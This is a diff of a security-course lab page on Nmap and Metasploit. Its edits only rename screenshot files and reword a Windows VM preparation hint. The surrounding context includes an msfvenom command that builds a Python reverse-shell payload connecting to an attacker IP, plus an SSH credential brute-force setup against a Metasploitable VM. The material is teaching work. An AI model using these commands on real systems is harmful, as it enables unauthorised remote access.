@@ -107,7 +107,7 @@ Now we can run it, let's run it against the metasploitable VM (check its IP addr
 
 Note that this is quite slow (give it a few mins), but once done, it will create a result file `[target IP].open_ports`. You can run the script against other VMs if you have, or locally by inputting `localhost`.
 
-![](<../.gitbook/assets/image (6) (1) (1) (2).png>)
+![](<../.gitbook/assets/image (6) (1) (1).png>)
 
 We just created our own port scanner using Bash!
 
@@ -272,7 +272,7 @@ Like before, set the `RHOST` to be the target IP address. In addition, we must a
 set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt
 ```
 
-![](<../.gitbook/assets/image (9) (3) (1).png>)
+![](<../.gitbook/assets/image (9) (3).png>)
 
 At this point, we can run the exploit (you can try, but it will take a while because its bruteforce, took me about 15 mins to finish). Since we know the credentials (msfadmin/msfadmin), we can shorten the waiting time by creating a shortened userpass file from the original file above (i.e., delete bunch of lines but keep the actual credential). Once run, you should eventually get to this:
 
@@ -326,7 +326,7 @@ The Metasploit also comes with tools to create vulnerable executable scripts/fil
 msfvenom -p python/shell_reverse_tcp LHOST=[attacker IP address] LPORT=[attacker listening port]
 ```
 
-![](<../.gitbook/assets/image (3) (1) (1) (2).png>)
+![](<../.gitbook/assets/image (3) (1) (1).png>)
 
 The payload created is a python executable code, which you can execute from your victim host. You will also notice that `msfvenom` applied code obfuscation techniques so that you cannot directly read the payload to understand exactly what this code is doing.
 
@@ -372,7 +372,7 @@ Let's test it first, we have to update the attacker's IP address in the `victim.
 
 Once done, we can now compile the c codes using the makefile provided (if you have binaries in the zip, delete them and recompile).
 
-![](<../.gitbook/assets/image (1) (2) (1).png>)
+![](<../.gitbook/assets/image (1) (2).png>)
 
 We can do this on a single machine, but you can also move the victim code to a different VM (remember to recompile if different architecture).
 
@@ -408,5 +408,5 @@ In this lab, we covered two useful tools, Nmap and Metasploit. There were additi
 Next up, Malware.
 
 {% hint style="info" %}
-PREPARATION: the next lab uses a new VM - Windows 10. The ISO file is HUGE (\~6GB), so please download and set up the Windows 10 VM before going to the lab.
+PREPARATION: the next lab uses a new VM - Windows. The ISO file is HUGE (\~6GB), so please download and set up the Windows VM before going to the lab.
 {% endhint %}
